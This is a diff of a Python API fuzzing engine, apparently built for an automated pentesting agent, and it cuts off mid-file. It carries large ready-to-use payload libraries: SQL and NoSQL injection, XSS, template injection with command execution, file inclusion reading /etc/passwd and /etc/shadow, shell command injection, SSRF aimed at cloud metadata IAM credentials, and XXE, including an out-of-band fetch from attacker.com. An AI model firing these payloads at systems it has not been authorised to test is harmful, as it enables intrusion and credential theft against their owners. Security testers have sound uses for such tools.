@@ -1,435 +1,386 @@
-import subprocess
-import json
-import re
-import time
-import random
-import string
-import requests
+#/+
+"""
+api_fuzzer_v3.py
+════════════════
+Agent-optimized API fuzzing engine.
+
+Design principles
+─────────────────
+• Output is agent-first: critical_findings[], param_summaries[], method_results[],
+  content_type_results[] are pre-ranked and pre-filtered.  fuzz_results[] is
+  intentionally omitted from the final dict to eliminate noise.
+• Token-budget: every result carries only fields that change a triage decision.
+• Token-bucket rate limiter shared across all threads.
+• Per-finding deduplication by (url, param, payload_type, finding_type).
+• Early-exit per param once a critical finding is confirmed.
+• OpenAPI/Swagger ingestion drives endpoint + param discovery automatically.
+• GraphQL introspection → field-level fuzzing pipeline.
+• Entropy-based secret detection on every response.
+• Session-pooled HTTP (one requests.Session per endpoint).
+• ffuf path validation before subprocess launch.
+"""
+
+from __future__ import annotations
+
 import concurrent.futures
-from typing import Optional, Any
+import hashlib
+import json
+import logging
+import math
+import os
+import re
+import subprocess
+import tempfile
+import threading
+import time
+from typing import Any, Optional
+from urllib.parse import parse_qs, urlencode, urlparse
+
+import requests
+import urllib3
 from pydantic import BaseModel, Field, field_validator
 
-# ══════════════════════════════════════════════════════════════
-# 1. SCHEMAS
-# ══════════════════════════════════════════════════════════════
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-class APIFuzzRequest(BaseModel):
-    tool: str
-    target: str
-    args: list[str] = []
-    timeout: int = Field(default=600, ge=30, le=7200)
-    endpoints: list[str] = []
-    headers: dict[str, str] = {}
-    wordlist: Optional[str] = None
-    methods: list[str] = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"]
-    content_types: list[str] = [
-        "application/json",
-        "application/x-www-form-urlencoded",
-        "multipart/form-data",
-        "text/xml",
-        "application/xml",
-        "text/plain",
-    ]
-    params: dict[str, str] = {}         # baseline params to fuzz
-    body: Optional[str] = None          # baseline body to fuzz
+log = logging.getLogger("api_fuzzer")
+logging.basicConfig(level=logging.INFO,
+                    format="%(asctime)s [%(levelname)s] %(message)s")
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# §1  RATE LIMITER
+# ══════════════════════════════════════════════════════════════════════════════
+
+class _TokenBucket:
+    """Global token-bucket shared across all threads."""
+
+    def __init__(self, rps: float = 30.0) -> None:
+        self._cap   = max(1.0, float(rps))
+        self._tok   = self._cap
+        self._rps   = float(rps)
+        self._ts    = time.monotonic()
+        self._lock  = threading.Lock()
+        self._used  = 0
+
+    def acquire(self) -> None:
+        while True:
+            with self._lock:
+                now = time.monotonic()
+                self._tok = min(self._cap,
+                                self._tok + (now - self._ts) * self._rps)
+                self._ts  = now
+                if self._tok >= 1.0:
+                    self._tok -= 1.0
+                    self._used += 1
+                    return
+            time.sleep(0.005)
+
+    @property
+    def used(self) -> int:
+        with self._lock:
+            return int(self._used)
+
+
+_LIMITER = _TokenBucket(30.0)   # replaced per api_fuzzing() call
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# §2  SCHEMAS
+# ══════════════════════════════════════════════════════════════════════════════
+
+_BLOCKED_HOSTS = frozenset({
+    "127.0.0.1", "localhost", "0.0.0.0", "::1", "[::]",
+})
+_DANGEROUS_CHARS = (";", "&&", "||", "|", "`", "$(", ">>")
+_BLOCKED_FLAGS   = frozenset({"-o", "--output", "-O", "-od"})
+
+_RE_DOMAIN  = re.compile(r"^https?://[a-zA-Z0-9]([a-zA-Z0-9\-]*\.)+[a-zA-Z]{2,}")
+_RE_BARE    = re.compile(r"^[a-zA-Z0-9]([a-zA-Z0-9\-]*\.)+[a-zA-Z]{2,}$")
+_RE_IP_HTTP = re.compile(r"^https?://(\d{1,3}\.){3}\d{1,3}")
+
+
+def _host(url: str) -> str:
+    try:
+        return (urlparse(url if "://" in url else f"https://{url}").hostname or "").lower()
+    except Exception:
+        return ""
+
+
+# ── Request schema ─────────────────────────────────────────────────────────
+
+class FuzzRequest(BaseModel):
+    tool:        str
+    target:      str
+    args:        list[str]       = []
+    timeout:     int             = Field(600, ge=30, le=7200)
+    endpoints:   list[str]      = []
+    headers:     dict[str, str] = {}
+    wordlist:    Optional[str]  = None
+    methods:     list[str]      = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"]
+    params:      dict[str, str] = {}
+    body:        Optional[str]  = None
+    rps:         float          = Field(30.0, ge=1.0, le=500.0)
+    openapi_url: Optional[str]  = None
+    quick:       bool           = False
+    payload_cap: int            = Field(15, ge=1, le=30)
+    max_endpoints: int          = Field(0, ge=0, le=100)
+    confirm_findings: bool      = True
+    confirmation_attempts: int  = Field(8, ge=1, le=30)
 
     @field_validator("tool")
     @classmethod
-    def validate_tool(cls, v):
-        allowed = {"ffuf", "nuclei", "manual"}
-        if v not in allowed:
-            raise ValueError(f"Tool '{v}' not allowed. Use: {allowed}")
+    def _tool(cls, v: str) -> str:
+        if v not in {"ffuf", "manual"}:
+            raise ValueError(f"tool must be ffuf | manual, got '{v}'")
         return v
 
     @field_validator("target")
     @classmethod
-    def validate_target(cls, v):
-        blocked = ["127.0.0.1", "localhost", "0.0.0.0", "::1"]
-        if v.strip() in blocked:
-            raise ValueError(f"Target '{v}' is blocked")
-        domain  = r"^https?://[a-zA-Z0-9]([a-zA-Z0-9\-]*\.)+[a-zA-Z]{2,}"
-        bare    = r"^[a-zA-Z0-9]([a-zA-Z0-9\-]*\.)+[a-zA-Z]{2,}$"
-        ip_http = r"^https?://(\d{1,3}\.){3}\d{1,3}"
-        if not (re.match(domain, v) or re.match(bare, v)
-                or re.match(ip_http, v)):
-            raise ValueError(f"Invalid target: {v}")
-        return v.strip()
-
-    @validator("args")
-    def validate_args(cls, v):
-        dangerous = [";", "&&", "||", "|", "`", "$(", ">>", "'", '"']
-        blocked   = ["-o", "--output", "-O", "-od"]
-        for arg in v:
-            for c in dangerous:
-                if c in arg:
-                    raise ValueError(f"Dangerous char '{c}' in: {arg}")
-            for f in blocked:
-                if arg.strip() == f:
-                    raise ValueError(f"Blocked flag: {f}")
+    def _target(cls, v: str) -> str:
+        v = v.strip()
+        h = _host(v)
+        if h in _BLOCKED_HOSTS:
+            if os.getenv("PENTAFORGE_ALLOW_LOCAL_API_TARGETS") != "1":
+                raise ValueError(f"Target host is blocked: {v}")
+            # Allow explicit local HTTP(S) URLs when local override is enabled.
+            if not re.match(r"^https?://", v):
+                raise ValueError(f"Invalid target format: {v}")
+            return v
+        if not (_RE_DOMAIN.match(v) or _RE_BARE.match(v) or _RE_IP_HTTP.match(v)):
+            raise ValueError(f"Invalid target format: {v}")
         return v
 
-    @validator("methods")
-    def validate_methods(cls, v):
-        allowed = {"GET", "POST", "PUT", "DELETE", "PATCH",
-                   "OPTIONS", "HEAD", "TRACE", "CONNECT"}
-        return [m.upper() for m in v if m.upper() in allowed]
+    @field_validator("args")
+    @classmethod
+    def _args(cls, v: list[str]) -> list[str]:
+        for a in v:
+            for c in _DANGEROUS_CHARS:
+                if c in a:
+                    raise ValueError(f"Dangerous char '{c}' in arg: {a!r}")
+            if a.strip() in _BLOCKED_FLAGS:
+                raise ValueError(f"Blocked flag: {a!r}")
+        return v
+
+    @field_validator("methods")
+    @classmethod
+    def _methods(cls, v: list[str]) -> list[str]:
+        ok = {"GET","POST","PUT","PATCH","DELETE","OPTIONS","HEAD","TRACE","CONNECT"}
+        return [m.upper() for m in v if m.upper() in ok]
 
 
-# ── Single fuzz result ──
+# ── Result schemas ─────────────────────────────────────────────────────────
+
+class Finding(BaseModel):
+    """Single interesting HTTP interaction."""
+    url:          str
+    method:       str
+    param:        Optional[str]   = None   # param_name or "header:X"
+    payload:      str
+    vuln_type:    str             = "none"
+    severity:     str             = "info"
+    status:       Optional[int]   = None
+    resp_time:    Optional[float] = None
+    resp_size:    Optional[int]   = None
+    snippet:      Optional[str]   = None
+    evidence:     list[str]       = []
+    _hash:        str             = ""
+
+    def stamp(self) -> "Finding":
+        raw = f"{self.url}|{self.param}|{self.vuln_type}|{self.payload[:40]}"
+        self._hash = hashlib.md5(raw.encode()).hexdigest()
+        return self
+
+
+class ParamSummary(BaseModel):
+    param:     str
+    endpoint:  str
+    vulns:     list[str]    = []   # distinct vuln_types
+    evidence:  list[str]   = []
+    severity:  str         = "info"
+    vulnerable: bool       = False
+
+
+class MethodResult(BaseModel):
+    endpoint:      str
+    unexpected:    list[str] = []   # dangerous/write methods that responded
+    evidence:      list[str] = []
+    vulnerable:    bool      = False
+
+
+class ContentTypeResult(BaseModel):
+    endpoint:    str
+    method:      str
+    bypassed:    bool      = False
+    accepted:    list[str] = []
+    evidence:    list[str] = []
+
+
 class FuzzResult(BaseModel):
-    url: str
-    method: str
-    payload: str
-    payload_type: str                   # sqli / xss / ssti / overflow /
-                                        # method / content_type / param / path
-    param_name: Optional[str] = None
-    status_code: Optional[int] = None
-    content_length: Optional[int] = None
-    response_time: Optional[float] = None
-    content_type: Optional[str] = None
-    redirect_url: Optional[str] = None
-    response_snippet: Optional[str] = None
-    error_detected: bool = False
-    interesting: bool = False
-    finding_type: str = "none"          # error / injection / method_allowed /
-                                        # content_type_bypass / path_traversal /
-                                        # overflow / info_leak
-    severity: str = "info"
-    evidence: list[str] = []
+    """Top-level return value — agent consumes this."""
+    success:              bool
+    vulnerable:           bool               = False
+    confidence:           str                = "none"
+    tool:                 str
+    target:               str
+    command:              str
+    exec_time:            float               = 0.0
+    techniques:           list[str]           = []
+    discovered_endpoints: list[str]           = []
+
+    # ── Agent-facing sections (ranked by severity) ──
+    critical_findings:    list[Finding]       = []   # severity critical | high
+    confirmed_findings:   list[Finding]       = []   # replay-validated high-signal findings
+    param_summaries:      list[ParamSummary]  = []   # per-param triage
+    method_results:       list[MethodResult]  = []
+    content_type_results: list[ContentTypeResult] = []
+
+    # ── Meta ──
+    quick_mode:           bool                = False
+    coverage_note:        str                 = ""
+    total_sent:           int                 = 0  # total request attempts (manual exact, ffuf includes estimate)
+    total_findings:       int                 = 0
+    total_interesting:    int                 = 0
+    llm_brief:            dict[str, Any]      = Field(default_factory=dict)
+    error:                Optional[str]       = None
 
 
-# ── Parameter analysis ──
-class ParamFuzzSummary(BaseModel):
-    param_name: str
-    endpoint: str
-    total_payloads: int = 0
-    interesting_responses: list[FuzzResult] = []
-    error_responses: list[FuzzResult] = []
-    anomalies: list[str] = []
-    vulnerable: bool = False
-    vuln_types: list[str] = []
+# ══════════════════════════════════════════════════════════════════════════════
+# §3  PAYLOADS
+# ══════════════════════════════════════════════════════════════════════════════
 
+_P: dict[str, list[tuple[str, str]]] = {
 
-# ── Method fuzz result ──
-class MethodFuzzResult(BaseModel):
-    endpoint: str
-    methods_tested: list[str] = []
-    methods_allowed: list[str] = []
-    methods_unexpected: list[str] = []   # allowed but shouldn't be
-    options_response: Optional[str] = None
-    vulnerable: bool = False
-    evidence: list[str] = []
+    "sqli": [
+        ("'",                                       "sqli_quote"),
+        ("' OR '1'='1'--",                          "sqli_or_true"),
+        ("' OR 1=1--",                              "sqli_or_int"),
+        ("1 UNION SELECT NULL,NULL--",              "sqli_union"),
+        ("1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", "sqli_error_mysql"),
+        ("1 AND SLEEP(3)--",                        "sqli_sleep"),
+        ("1; WAITFOR DELAY '0:0:3'--",              "sqli_waitfor"),
+        ("1 AND 1=1",                               "sqli_blind_true"),
+        ("1 AND 1=2",                               "sqli_blind_false"),
+        ('{"$gt":""}',                              "nosql_gt"),
+        ('{"$ne":null}',                            "nosql_ne"),
+        ('{"$where":"sleep(3000)"}',                "nosql_where"),
+        ("[$ne]=1",                                 "nosql_ne_param"),
+        ("admin'--",                                "sqli_admin"),
+        ("'; DROP TABLE users;--",                  "sqli_drop"),
+    ],
 
+    "xss": [
+        ("<script>alert(1)</script>",               "xss_script"),
+        ("<img src=x onerror=alert(1)>",            "xss_img"),
+        ("<svg onload=alert(1)>",                   "xss_svg"),
+        ('"><script>alert(1)</script>',             "xss_break_attr"),
+        ("javascript:alert(1)",                     "xss_js"),
+        ("<details open ontoggle=alert(1)>",        "xss_details"),
+        ("<input autofocus onfocus=alert(1)>",      "xss_autofocus"),
+        ("%3Cscript%3Ealert(1)%3C/script%3E",       "xss_urlenc"),
+        ("<iframe src=javascript:alert(1)>",        "xss_iframe"),
+        ("</script><script>alert(1)</script>",      "xss_close"),
+    ],
 
-# ── Content-type fuzz result ──
-class ContentTypeFuzzResult(BaseModel):
-    endpoint: str
-    method: str
-    results: list[FuzzResult] = []
-    accepted_types: list[str] = []
-    bypassed: bool = False
-    evidence: list[str] = []
+    "ssti": [
+        ("{{7*7}}",                                 "ssti_jinja2"),
+        ("${7*7}",                                  "ssti_el"),
+        ("#{7*7}",                                  "ssti_erb"),
+        ("<%= 7*7 %>",                              "ssti_erb2"),
+        ("*{7*7}",                                  "ssti_spring"),
+        ("{{7*'7'}}",                               "ssti_jinja2_str"),
+        ("${{7*7}}",                                "ssti_twig"),
+        ("{{config}}",                              "ssti_jinja2_cfg"),
+        ("${T(java.lang.Runtime).getRuntime().exec('id')}", "ssti_spring_rce"),
+        ("{{''.__class__.__mro__[1].__subclasses__()}}", "ssti_subclasses"),
+    ],
 
+    "lfi": [
+        ("../../../etc/passwd",                     "lfi_passwd"),
+        ("....//....//etc/passwd",                  "lfi_double_dot"),
+        ("..%2F..%2F..%2Fetc%2Fpasswd",            "lfi_urlenc"),
+        ("%2e%2e%2f%2e%2e%2fetc%2fpasswd",         "lfi_dblenc"),
+        ("..%252F..%252Fetc%252Fpasswd",           "lfi_dblenc2"),
+        ("..\\..\\windows\\win.ini",               "lfi_win"),
+        ("/proc/self/environ",                      "lfi_environ"),
+        ("file:///etc/passwd",                      "lfi_file_scheme"),
+        ("php://filter/convert.base64-encode/resource=index.php", "lfi_phpfilter"),
+        ("/etc/shadow",                             "lfi_shadow"),
+    ],
 
-# ── Final result ──
-class APIFuzzingResult(BaseModel):
-    success: bool
-    tool: str
-    target: str
-    command: str
-    total_requests: int = 0
-    total_interesting: int = 0
-    total_errors: int = 0
-    fuzz_results: list[FuzzResult] = []
-    param_summaries: list[ParamFuzzSummary] = []
-    method_results: list[MethodFuzzResult] = []
-    content_type_results: list[ContentTypeFuzzResult] = []
-    critical_findings: list[FuzzResult] = []
-    raw_output: Optional[str] = None
-    error: Optional[str] = None
-    execution_time: float = 0.0
-    techniques_used: list[str] = []
+    "cmdi": [
+        ("; id",                                    "cmdi_semi"),
+        ("| id",                                    "cmdi_pipe"),
+        ("`id`",                                    "cmdi_backtick"),
+        ("$(id)",                                   "cmdi_dollar"),
+        ("; sleep 3",                               "cmdi_sleep"),
+        ("; cat /etc/passwd",                       "cmdi_passwd"),
+        ("%0aid",                                   "cmdi_newline"),
+        ("${IFS}id",                                "cmdi_ifs"),
+        ("& ipconfig",                              "cmdi_win"),
+        ("|| id",                                   "cmdi_or"),
+    ],
 
+    "overflow": [
+        ("A" * 1000,                                "of_1k"),
+        ("A" * 10000,                               "of_10k"),
+        ("A" * 65535,                               "of_64k"),
+        ("%n" * 100,                                "of_fmtn"),
+        ("%s" * 100,                                "of_fmts"),
+        ("-1",                                      "of_neg"),
+        ("2147483648",                              "of_intmax"),
+        ("-2147483649",                             "of_intmin"),
+        ("9999999999999999999",                     "of_bignum"),
+        ("NaN",                                     "of_nan"),
+        ("null",                                    "of_null"),
+        ("[]",                                      "of_array"),
+        ("{}",                                      "of_obj"),
+    ],
 
-# ══════════════════════════════════════════════════════════════
-# 2. PAYLOAD LIBRARIES
-# ══════════════════════════════════════════════════════════════
+    "ssrf": [
+        ("http://169.254.169.254/latest/meta-data/",          "ssrf_aws"),
+        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "ssrf_aws_iam"),
+        ("http://metadata.google.internal/computeMetadata/v1/","ssrf_gcp"),
+        ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "ssrf_azure"),
+        ("http://localhost:80",                               "ssrf_lo80"),
+        ("http://127.0.0.1",                                  "ssrf_lo"),
+        ("http://0.0.0.0:80",                                 "ssrf_zero"),
+        ("http://2130706433",                                 "ssrf_dec"),
+        ("dict://localhost:11211/",                           "ssrf_memcache"),
+        ("gopher://localhost:6379/_PING",                     "ssrf_redis"),
+        ("file:///etc/passwd",                               "ssrf_file"),
+    ],
 
-# ── SQL Injection ──
-SQLI_PAYLOADS: list[dict] = [
-    # Classic
-    {"payload": "'",                          "label": "sqli_single_quote"},
-    {"payload": "''",                         "label": "sqli_double_quote"},
-    {"payload": "' OR '1'='1",               "label": "sqli_or_true"},
-    {"payload": "' OR '1'='1'--",            "label": "sqli_or_comment"},
-    {"payload": "' OR 1=1--",                "label": "sqli_or_int"},
-    {"payload": "' OR 1=1#",                 "label": "sqli_or_hash"},
-    {"payload": '" OR "1"="1',               "label": "sqli_double_or"},
-    {"payload": "1' ORDER BY 1--",           "label": "sqli_order_by"},
-    {"payload": "1' ORDER BY 100--",         "label": "sqli_order_by_high"},
-    {"payload": "1 UNION SELECT NULL--",     "label": "sqli_union_null"},
-    {"payload": "1 UNION SELECT NULL,NULL--","label": "sqli_union_null2"},
-    {"payload": "1 UNION SELECT 1,2,3--",   "label": "sqli_union_123"},
-    # Error-based
-    {"payload": "1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
-     "label": "sqli_error_mysql"},
-    {"payload": "1 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
-     "label": "sqli_error_mssql"},
-    {"payload": "1 AND 1=(SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),"
-                "FLOOR(RAND(0)*2))x FROM information_schema.tables "
-                "GROUP BY x)a)--",
-     "label": "sqli_error_group"},
-    # Blind
-    {"payload": "1 AND SLEEP(3)--",          "label": "sqli_time_sleep"},
-    {"payload": "1; WAITFOR DELAY '0:0:3'--","label": "sqli_time_waitfor"},
-    {"payload": "1 AND 1=1",                 "label": "sqli_blind_true"},
-    {"payload": "1 AND 1=2",                 "label": "sqli_blind_false"},
-    {"payload": "1' AND SLEEP(3)--",         "label": "sqli_time_str"},
-    # NoSQL
-    {"payload": '{"$gt": ""}',               "label": "nosql_gt"},
-    {"payload": '{"$ne": null}',             "label": "nosql_ne"},
-    {"payload": '{"$where": "sleep(3000)"}',"label": "nosql_where_sleep"},
-    {"payload": "' || '1'=='1",              "label": "nosql_or"},
-    {"payload": "[$ne]=1",                   "label": "nosql_ne_param"},
-    # ORM
-    {"payload": "1 OR 1=1",                  "label": "sqli_orm_or"},
-    {"payload": "admin'--",                  "label": "sqli_admin_comment"},
-    {"payload": "' HAVING 1=1--",            "label": "sqli_having"},
-    {"payload": "'; DROP TABLE users;--",    "label": "sqli_drop"},
-    {"payload": "' AND 1=CAST((SELECT "
-                "TOP 1 table_name FROM "
-                "information_schema.tables) AS int)--",
-     "label": "sqli_cast"},
+    "xxe": [
+        ('<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>\n<foo>&x;</foo>',
+         "xxe_passwd"),
+        ('<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]>\n<foo>&x;</foo>',
+         "xxe_ssrf"),
+        ('<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/shadow">]>\n<foo>&x;</foo>',
+         "xxe_shadow"),
+        ('<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>\n<foo>&x;</foo>',
+         "xxe_php"),
+        ('<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY % x SYSTEM "http://attacker.com/evil.dtd"> %x;]>\n<foo/>',
+         "xxe_oob"),
+    ],
+
+    "redirect": [
+        ("https://evil.com",                        "redir_ext"),
+        ("//evil.com",                              "redir_proto"),
+        ("/\\evil.com",                             "redir_backslash"),
+        ("https://evil.com%2F@target",             "redir_at"),
+        ("javascript:alert(1)",                     "redir_js"),
+        ("%2Fevil.com",                             "redir_enc"),
+        ("%252Fevil.com",                           "redir_dblenc"),
+    ],
+}
+
+_ALL_METHODS = [
+    "GET","POST","PUT","PATCH","DELETE","OPTIONS","HEAD","TRACE",
+    "CONNECT","PROPFIND","PROPPATCH","MKCOL","COPY","MOVE",
+    "LOCK","UNLOCK","SEARCH","PURGE","DEBUG",
 ]
 
-# ── XSS ──
-XSS_PAYLOADS: list[dict] = [
-    {"payload": "<script>alert(1)</script>",         "label": "xss_script"},
-    {"payload": "<img src=x onerror=alert(1)>",      "label": "xss_img"},
-    {"payload": "<svg onload=alert(1)>",             "label": "xss_svg"},
-    {"payload": "javascript:alert(1)",               "label": "xss_javascript"},
-    {"payload": '"><script>alert(1)</script>',       "label": "xss_break_attr"},
-    {"payload": "'><script>alert(1)</script>",       "label": "xss_break_sq"},
-    {"payload": "</script><script>alert(1)</script>","label": "xss_close_script"},
-    {"payload": "<ScRiPt>alert(1)</sCrIpT>",         "label": "xss_case"},
-    {"payload": "%3Cscript%3Ealert(1)%3C/script%3E", "label": "xss_url_enc"},
-    {"payload": "&#60;script&#62;alert(1)&#60;/script&#62;","label": "xss_html_enc"},
-    {"payload": "<img src=x onerror=alert`1`>",      "label": "xss_template"},
-    {"payload": "<details open ontoggle=alert(1)>",  "label": "xss_details"},
-    {"payload": "<body onload=alert(1)>",            "label": "xss_body"},
-    {"payload": '"><img src=x onerror=alert(1)>',   "label": "xss_break_img"},
-    # DOM
-    {"payload": "#<script>alert(1)</script>",        "label": "xss_dom_hash"},
-    {"payload": "javascript:void(alert(1))",         "label": "xss_void"},
-    # Filter bypass
-    {"payload": "<scr<script>ipt>alert(1)</scr</script>ipt>",
-     "label": "xss_nested"},
-    {"payload": "<svg><script>alert(1)</script></svg>","label": "xss_svg_script"},
-    {"payload": "<iframe src=javascript:alert(1)>",  "label": "xss_iframe"},
-    {"payload": "<input autofocus onfocus=alert(1)>","label": "xss_autofocus"},
-]
-
-# ── SSTI (Server Side Template Injection) ──
-SSTI_PAYLOADS: list[dict] = [
-    # Generic detection
-    {"payload": "{{7*7}}",                   "label": "ssti_jinja2_basic"},
-    {"payload": "${7*7}",                    "label": "ssti_java_el"},
-    {"payload": "#{7*7}",                    "label": "ssti_ruby_erb"},
-    {"payload": "<%= 7*7 %>",               "label": "ssti_erb_basic"},
-    {"payload": "*{7*7}",                   "label": "ssti_spring"},
-    {"payload": "{{7*'7'}}",               "label": "ssti_jinja2_str"},
-    {"payload": "${{7*7}}",                 "label": "ssti_twig"},
-    {"payload": "{7*7}",                    "label": "ssti_freemarker"},
-    {"payload": "{{config}}",              "label": "ssti_jinja2_config"},
-    {"payload": "{{self._TemplateReference__context.cycler.__init__"
-                ".__globals__.os.popen('id').read()}}",
-     "label": "ssti_jinja2_rce"},
-    # Jinja2
-    {"payload": "{{''.__class__.__mro__[1].__subclasses__()}}",
-     "label": "ssti_jinja2_subclasses"},
-    {"payload": "{{request.application.__globals__.__builtins__"
-                ".__import__('os').popen('id').read()}}",
-     "label": "ssti_jinja2_os"},
-    # Twig
-    {"payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}"
-                "{{_self.env.getFilter('id')}}",
-     "label": "ssti_twig_exec"},
-    # Freemarker
-    {"payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>"
-                "${ex('id')}",
-     "label": "ssti_freemarker_exec"},
-    # Velocity
-    {"payload": "#set($str=$class.inspect('java.lang.String').type)"
-                "#set($chr=$class.inspect('java.lang.Character').type)"
-                "#set($ex=$class.inspect('java.lang.Runtime').type.getRuntime())"
-                "$ex.exec('id')",
-     "label": "ssti_velocity"},
-    # Expression Language
-    {"payload": "${T(java.lang.Runtime).getRuntime().exec('id')}",
-     "label": "ssti_spring_rce"},
-    {"payload": "T(java.lang.Runtime).getRuntime().exec('id')",
-     "label": "ssti_el_runtime"},
-]
-
-# ── Path Traversal / LFI ──
-PATH_TRAVERSAL_PAYLOADS: list[dict] = [
-    {"payload": "../../../etc/passwd",         "label": "lfi_passwd"},
-    {"payload": "../../etc/passwd",            "label": "lfi_passwd2"},
-    {"payload": "../etc/passwd",               "label": "lfi_passwd3"},
-    {"payload": "/etc/passwd",                 "label": "lfi_passwd_abs"},
-    {"payload": "....//....//....//etc/passwd","label": "lfi_double_dot"},
-    {"payload": "..%2F..%2F..%2Fetc%2Fpasswd","label": "lfi_url_enc"},
-    {"payload": "%2e%2e%2f%2e%2e%2fetc%2fpasswd","label": "lfi_double_url"},
-    {"payload": "..%252F..%252Fetc%252Fpasswd","label": "lfi_double_enc"},
-    {"payload": "..\\..\\..\\windows\\win.ini","label": "lfi_windows"},
-    {"payload": "..\\..\\..\\.\\etc\\passwd",  "label": "lfi_backslash"},
-    {"payload": "/proc/self/environ",          "label": "lfi_environ"},
-    {"payload": "/proc/self/cmdline",          "label": "lfi_cmdline"},
-    {"payload": "/etc/shadow",                 "label": "lfi_shadow"},
-    {"payload": "/etc/hosts",                  "label": "lfi_hosts"},
-    {"payload": "file:///etc/passwd",          "label": "lfi_file_scheme"},
-    {"payload": "php://filter/convert.base64-encode/resource=index.php",
-     "label": "lfi_php_filter"},
-    {"payload": "php://input",                 "label": "lfi_php_input"},
-    {"payload": "expect://id",                 "label": "lfi_expect"},
-    {"payload": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
-     "label": "lfi_data_b64"},
-]
-
-# ── Command Injection ──
-CMDI_PAYLOADS: list[dict] = [
-    {"payload": "; id",                       "label": "cmdi_semicolon"},
-    {"payload": "| id",                       "label": "cmdi_pipe"},
-    {"payload": "|| id",                      "label": "cmdi_or"},
-    {"payload": "& id",                       "label": "cmdi_amp"},
-    {"payload": "&& id",                      "label": "cmdi_and"},
-    {"payload": "`id`",                       "label": "cmdi_backtick"},
-    {"payload": "$(id)",                      "label": "cmdi_dollar"},
-    {"payload": "; sleep 3",                  "label": "cmdi_sleep"},
-    {"payload": "| sleep 3",                  "label": "cmdi_pipe_sleep"},
-    {"payload": "& ping -c 3 127.0.0.1 &",   "label": "cmdi_ping"},
-    {"payload": "; cat /etc/passwd",          "label": "cmdi_passwd"},
-    {"payload": "%0aid",                      "label": "cmdi_newline"},
-    {"payload": "%0a id %0a",                 "label": "cmdi_newline2"},
-    {"payload": "${IFS}id",                   "label": "cmdi_ifs"},
-    {"payload": "1;id",                       "label": "cmdi_inline"},
-    # Windows
-    {"payload": "| dir",                      "label": "cmdi_win_dir"},
-    {"payload": "& ipconfig",                 "label": "cmdi_win_ipconfig"},
-    {"payload": "; timeout 3",                "label": "cmdi_win_timeout"},
-]
-
-# ── Buffer Overflow / Overflow ──
-OVERFLOW_PAYLOADS: list[dict] = [
-    {"payload": "A" * 100,                   "label": "overflow_100"},
-    {"payload": "A" * 500,                   "label": "overflow_500"},
-    {"payload": "A" * 1000,                  "label": "overflow_1k"},
-    {"payload": "A" * 5000,                  "label": "overflow_5k"},
-    {"payload": "A" * 10000,                 "label": "overflow_10k"},
-    {"payload": "A" * 65535,                 "label": "overflow_64k"},
-    {"payload": "%n" * 100,                  "label": "overflow_format_n"},
-    {"payload": "%s" * 100,                  "label": "overflow_format_s"},
-    {"payload": "%x" * 100,                  "label": "overflow_format_x"},
-    {"payload": "0" * 1000,                  "label": "overflow_zeros"},
-    {"payload": "\x00" * 100,               "label": "overflow_null"},
-    {"payload": "\xff" * 100,               "label": "overflow_ff"},
-    {"payload": "-1",                        "label": "overflow_neg"},
-    {"payload": "2147483647",               "label": "overflow_int_max"},
-    {"payload": "2147483648",               "label": "overflow_int_overflow"},
-    {"payload": "-2147483649",              "label": "overflow_int_underflow"},
-    {"payload": "9999999999999999999",       "label": "overflow_bignum"},
-    {"payload": "0.0000000000000001",        "label": "overflow_float_tiny"},
-    {"payload": "999999999999999.9999",      "label": "overflow_float_big"},
-    {"payload": "NaN",                       "label": "overflow_nan"},
-    {"payload": "Infinity",                  "label": "overflow_inf"},
-    {"payload": "null",                      "label": "type_null"},
-    {"payload": "true",                      "label": "type_bool_true"},
-    {"payload": "false",                     "label": "type_bool_false"},
-    {"payload": "[]",                        "label": "type_array"},
-    {"payload": "{}",                        "label": "type_object"},
-]
-
-# ── SSRF ──
-SSRF_PAYLOADS: list[dict] = [
-    {"payload": "http://169.254.169.254/latest/meta-data/",
-     "label": "ssrf_aws_metadata"},
-    {"payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-     "label": "ssrf_aws_iam"},
-    {"payload": "http://metadata.google.internal/computeMetadata/v1/",
-     "label": "ssrf_gcp_metadata"},
-    {"payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
-     "label": "ssrf_azure_metadata"},
-    {"payload": "http://localhost:80",        "label": "ssrf_localhost_80"},
-    {"payload": "http://localhost:8080",      "label": "ssrf_localhost_8080"},
-    {"payload": "http://localhost:22",        "label": "ssrf_localhost_22"},
-    {"payload": "http://0.0.0.0:80",          "label": "ssrf_zero_80"},
-    {"payload": "http://127.0.0.1",           "label": "ssrf_loopback"},
-    {"payload": "http://[::1]",               "label": "ssrf_ipv6_loopback"},
-    {"payload": "http://2130706433",          "label": "ssrf_decimal_loopback"},
-    {"payload": "http://0177.0.0.1",          "label": "ssrf_octal_loopback"},
-    {"payload": "dict://localhost:11211/",    "label": "ssrf_dict_memcache"},
-    {"payload": "gopher://localhost:6379/_PING","label": "ssrf_gopher_redis"},
-    {"payload": "file:///etc/passwd",         "label": "ssrf_file"},
-    {"payload": "http://localtest.me",        "label": "ssrf_dns_rebind"},
-    {"payload": "http://spoofed.burpcollaborator.net",
-     "label": "ssrf_oob_burp"},
-]
-
-# ── XXE ──
-XXE_PAYLOADS: list[dict] = [
-    {"payload": """<?xml version="1.0"?>
